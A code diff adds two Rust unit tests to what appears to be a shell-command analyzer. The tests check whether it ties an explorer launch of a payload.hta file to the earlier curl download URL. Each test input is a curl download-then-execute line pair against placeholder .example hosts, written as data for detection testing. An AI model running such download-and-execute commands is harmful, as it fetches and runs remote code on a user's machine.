@@ -13238,6 +13238,48 @@ explorer .\payload.hta"#,
     }
 
     #[test]
+    fn explorer_current_dir_nested_target_does_not_use_unrelated_basename_download() {
+        let report = crate::analyze(
+            br#"curl -o D:\Other\payload.hta https://explorer-current-dir-wrong-basename.example/payload.hta
+explorer .\Temp\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"explorer .\Temp\payload.hta"#
+                            && url == "https://explorer-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "Explorer current-dir nested target reused unrelated basename download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn explorer_current_dir_nested_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o .\Temp\payload.hta https://explorer-current-dir-nested-source.example/payload.hta
+explorer .\Temp\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"explorer .\Temp\payload.hta"#
+                            && url == "https://explorer-current-dir-nested-source.example/payload.hta"
+                )
+            }),
+            "Explorer current-dir nested target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn explorer_slash_equivalent_local_target_resolves_prior_download_source_url() {
         let report = crate::analyze(
             br#"curl -o C:\Temp\payload.hta https://explorer-slash-source.example/payload.hta
